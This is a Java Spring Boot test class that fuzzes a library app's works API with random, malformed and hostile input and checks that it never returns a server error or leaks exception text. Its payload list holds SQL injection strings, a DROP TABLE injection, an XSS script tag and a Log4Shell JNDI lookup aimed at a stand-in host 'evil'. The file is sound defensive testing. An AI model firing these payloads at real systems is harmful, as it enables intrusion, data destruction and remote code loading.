package io.github.adamstac.libraryapp.library;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.adamstac.libraryapp.ApiBrowser;
import io.github.adamstac.libraryapp.TestcontainersConfiguration;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.Import;
import org.springframework.jdbc.core.simple.JdbcClient;
import org.springframework.security.crypto.password.PasswordEncoder;

/** Random and malicious input to the works API must never crash it (500) or leak internals. Fixed seed. */
@Import(TestcontainersConfiguration.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties = ApiBrowser.MANY_SIGN_INS)
class WorkHostileInputTests {

    private static final String[] NASTY = {
        "' OR '1'='1", "\"; DROP TABLE works; --", "<script>alert(1)</script>", "${jndi:ldap://evil/x}",
        "\u0000", "%00", "‮evil", "\uD800", "ﷺ", "😀", "صحيح البخاري", "", " ", "\n"
    };

    @Value("${local.server.port}")
    private int port;

    @Autowired
    private JdbcClient jdbc;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Test
    void randomFieldValuesNeverCrashTheApi() throws Exception {
        Random random = new Random(20261028L);
        ApiBrowser reader = null;
        String existing = null;
        String author = null;
        for (int i = 0; i < 200; i++) {
            if (i % 40 == 0) { // a fresh account now and then, so the limit on changes a minute isn't reached
                reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
                existing = reader.post(WorkTests.WORKS, "{\"titleEn\":\"x\"}").headers().firstValue("Location")
                        .orElseThrow();
                String authorPath = reader.post(WorkTests.AUTHORS, "{\"nameEn\":\"x\"}").headers()
                        .firstValue("Location").orElseThrow();
                author = authorPath.substring(authorPath.lastIndexOf('/') + 1);
            }
            String body = randomBody(random, author);

            HttpResponse<String> response = i % 2 == 0
                    ? reader.post(WorkTests.WORKS, body)
                    : reader.put(existing, body, "\"" + random.nextInt(3) + "\"");

            assertThat(response.statusCode()).as(body).isIn(200, 201, 400, 409);
            assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception").doesNotContain("trace");
        }
    }

    @Test
    void malformedRequestsAreRejectedCleanly() throws Exception {
        ApiBrowser reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
        String existing = reader.post(WorkTests.WORKS, "{\"titleEn\":\"x\"}").headers().firstValue("Location")
                .orElseThrow();
        List<String> bodies = List.of(
                "", "{", "null", "[]", "42", "\"text\"", "<xml/>", "{\"titleEn\":{}}", "{\"titleEn\":[\"a\"]}",
                "{\"titleEn\":\"x\",\"scienceId\":{}}", "{\"titleEn\":\"x\",\"scienceId\":\"not-an-id\"}",
                "{\"titleEn\":\"x\",\"authorIds\":{}}", "{\"titleEn\":\"x\",\"authorIds\":[[\"a\"]]}",
                "{\"titleEn\":\"x\",\"authorIds\":[\"not-an-id\"]}");
        for (String body : bodies) {
            for (HttpResponse<String> response : List.of(
                    reader.post(WorkTests.WORKS, body), reader.put(existing, body, "\"0\""))) {
                assertThat(response.statusCode()).as(body).isIn(400, 415);
                assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception");
            }
        }
        assertThat(reader.get(WorkTests.WORKS + "/not-an-id").statusCode()).isEqualTo(400);
        assertThat(reader.get(WorkTests.WORKS + "/" + UUID.randomUUID() + "x").statusCode()).isEqualTo(400);
        assertThat(reader.send("POST", WorkTests.WORKS, "{\"titleEn\":\"y\"}", "text/plain", null, true).statusCode())
                .isEqualTo(415);
    }

    private static String randomBody(Random random, String author) {
        StringBuilder body = new StringBuilder("{");
        for (String field : new String[] {"titleAr", "titleEn"}) {
            if (random.nextInt(3) > 0) {
                body.append(json(field)).append(':').append(json(randomText(random))).append(',');
            }
        }
        body.append("\"scienceId\":").append(switch (random.nextInt(3)) {
            case 0 -> "null";
            case 1 -> json(UUID.randomUUID().toString());
            default -> json(randomText(random));
        }).append(',');
        body.append("\"authorIds\":").append(switch (random.nextInt(4)) {
            case 0 -> "null";
            case 1 -> "[" + json(author) + "," + json(author) + "]";
            case 2 -> "[" + json(UUID.randomUUID().toString()) + "]";
            default -> "[" + json(randomText(random)) + "]";
        });
        return body.append('}').toString();
    }

    private static String randomText(Random random) {
        if (random.nextInt(4) == 0) {
            return NASTY[random.nextInt(NASTY.length)];
        }
        int length = random.nextInt(random.nextInt(10) == 0 ? 600 : 40);
        StringBuilder text = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int codePoint = switch (random.nextInt(5)) {
                case 0 -> random.nextInt(0x20); // control characters
                case 1 -> 0x0600 + random.nextInt(0x100); // Arabic block
                case 2 -> 0x2000 + random.nextInt(0x70); // punctuation, including direction controls
                case 3 -> random.nextInt(0x1FFFF); // anything, including emoji and lone surrogates
                default -> 0x20 + random.nextInt(0x5F); // printable ASCII
            };
            text.appendCodePoint(codePoint);
        }
        return text.toString();
    }

    /** JSON string escaping that keeps lone surrogates as \\u escapes, so they reach the API as sent. */
    private static String json(String value) {
        StringBuilder out = new StringBuilder("\"");
        for (char c : value.toCharArray()) {
            if (c == '"' || c == '\\') {
                out.append('\\').append(c);
            } else if (c < 0x20 || Character.isSurrogate(c)) {
                out.append(String.format("\\u%04x", (int) c));
            } else {
                out.append(c);
            }
        }
        return out.append('"').toString();
    }
}
